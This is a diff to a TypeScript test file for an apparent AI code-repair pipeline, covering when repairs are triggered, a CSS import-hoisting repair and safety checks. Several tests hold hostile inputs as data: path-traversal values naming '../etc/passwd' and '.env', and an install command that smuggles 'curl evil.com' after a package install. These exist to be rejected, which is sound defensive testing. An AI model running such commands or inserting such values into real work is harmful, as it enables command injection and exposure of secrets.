@@ -17,6 +17,7 @@ import {
   selectRepairReason,
   shouldAttemptRepair,
 } from './repair'
+import { validateFragmentIntegrity } from './fragment-integrity'
 import { FragmentSchema } from './schema'
 import { shouldSmokeTest, type SmokeSuiteResult } from './smoke'
 import { VerificationResult } from './verification'
@@ -389,6 +390,66 @@ test('partial runtime alone does not trigger repair', () => {
   )
 })
 
+test('compile overlay on partial runtime does trigger repair', () => {
+  assert.equal(
+    shouldAttemptRepair({
+      repairAttempts: 0,
+      verification: {
+        ...failedVerification(),
+        status: 'partial',
+        errors: [
+          "components/MenuSection.tsx:5 Parsing ecmascript source code failed Unexpected token 'section'. Expected jsx identifier",
+        ],
+        previewReachable: false,
+      },
+    }),
+    true,
+  )
+})
+
+test('hydration overlay on partial runtime does trigger repair', () => {
+  assert.equal(
+    shouldAttemptRepair({
+      repairAttempts: 0,
+      verification: {
+        ...failedVerification(),
+        status: 'partial',
+        errors: [
+          'Hydration failed because the initial UI does not match what was rendered on the server. Expected server HTML to contain a matching <a> in <a>.',
+        ],
+        previewReachable: false,
+      },
+    }),
+    true,
+  )
+})
+
+test('E2B transport fetch failed does not trigger LLM source repair', () => {
+  assert.equal(
+    shouldAttemptRepair({
+      repairAttempts: 0,
+      architectureCompliance: gymArchPass(),
+      verification: failedVerification(['fetch failed · code=ECONNRESET']),
+    }),
+    false,
+  )
+  assert.equal(
+    selectRepairReason({
+      architectureCompliance: gymArchPass(),
+      verification: failedVerification(['fetch failed']),
+    }),
+    null,
+  )
+  assert.equal(
+    shouldAttemptRepair({
+      repairAttempts: 0,
+      architectureCompliance: gymArchPass(),
+      verification: failedVerification(['Module not found: recharts']),
+    }),
+    true,
+  )
+})
+
 test('rejects path traversal', () => {
   assert.equal(isSafeRepairPath('../etc/passwd'), false)
   assert.equal(isSafeRepairPath('.env'), false)
@@ -442,6 +503,42 @@ test('rejects unsafe install command', () => {
     install_dependencies_command: 'npm install recharts; curl evil.com',
   })
   assert.equal(outcome.ok, false)
+})
+
+test('CSS repair apply preserves rules and revalidates after hoist', () => {
+  const original = makeFragment({
+    code: [
+      {
+        file_path: 'pages/index.tsx',
+        file_content: 'export default function Home(){ return <div>Hi</div> }',
+      },
+      {
+        file_path: 'styles/globals.css',
+        file_content:
+          ':root { --fg: #111; }\n@keyframes fade { from { opacity: 0 } to { opacity: 1 } }\n@import url("https://fonts.googleapis.com/css2?family=Inter&display=swap");\n',
+      },
+    ],
+  })
+  const outcome = applyRepairToFragment(original, {
+    explanation: 'Move @import to the top; keep all rules',
+    changedFiles: ['styles/globals.css'],
+    files: [
+      {
+        file_path: 'styles/globals.css',
+        action: 'modify',
+        file_content:
+          '@import url("https://fonts.googleapis.com/css2?family=Inter&display=swap");\n:root { --fg: #111; }\n@keyframes fade { from { opacity: 0 } to { opacity: 1 } }\n',
+      },
+    ],
+  })
+  assert.equal(outcome.ok, true)
+  if (!outcome.ok) return
+  const css = outcome.fragment.code.find((f) => f.file_path === 'styles/globals.css')
+  assert.ok(css)
+  assert.match(css!.file_content, /^@import url\(/)
+  assert.ok(css!.file_content.includes('@keyframes fade'))
+  assert.ok(css!.file_content.includes('--fg: #111'))
+  assert.equal(validateFragmentIntegrity(outcome.fragment).ok, true)
 })
 
 console.log(`\n${passed} tests passed`)
